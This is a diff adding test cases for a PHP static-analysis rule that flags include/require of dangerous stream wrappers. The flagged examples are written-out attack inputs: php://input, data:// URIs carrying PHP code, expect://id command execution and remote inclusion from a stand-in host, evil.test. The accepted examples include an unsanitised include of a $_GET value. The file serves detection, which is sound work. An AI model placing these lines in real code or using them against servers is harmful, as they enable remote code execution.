@@ -1,0 +1,37 @@
+id: php-include-stream-wrapper
+valid:
+# php://memory and php://temp start empty on every open: nothing to execute.
+- <?php include "php://memory";
+- <?php include("php://temp");
+- <?php include "/var/www/app/bootstrap.php";
+- <?php require_once "lib/helpers.php";
+- <?php include __DIR__ . "/lib.php";
+- <?php include "lib/php://notascheme.php";
+# The parenthesized form of a benign path stays clean.
+- <?php include("/var/www/app/bootstrap.php");
+- <?php require_once("lib/helpers.php");
+- <?php include "$base/php://x.php";
+- <?php include $_GET["p"];
+- <?php fopen("php://input", "r");
+- <?php file_get_contents("php://input");
+- <?php // include "php://input";
+- <?php $s = "include 'php://input';";
+- <?php require_once 'phar://app.phar/boot.php';
+- <?php include "ftp://mirror.internal/x.php";
+invalid:
+# All four keywords in the parenthesized form: include("...") wraps the
+# operand in a parenthesized_expression rather than making it a direct child.
+- <?php include("php://input");
+- <?php include_once("data://text/plain,x");
+- <?php require("expect://id");
+- <?php require_once("http://evil.test/x.php");
+# Single-quoted inside parentheses is `string`, not `encapsed_string`.
+- <?php include('php://input');
+- <?php include "php://input";
+- <?php require "data://text/plain;base64,PD9waHA=";
+- <?php include_once "http://evil.test/x.php";
+- <?php include "https://evil.test/x.php";
+- <?php include "expect://id";
+- <?php INCLUDE "PHP://INPUT";
+- <?php require_once 'php://input';
+- <?php include 'data://text/plain,<?php phpinfo();';
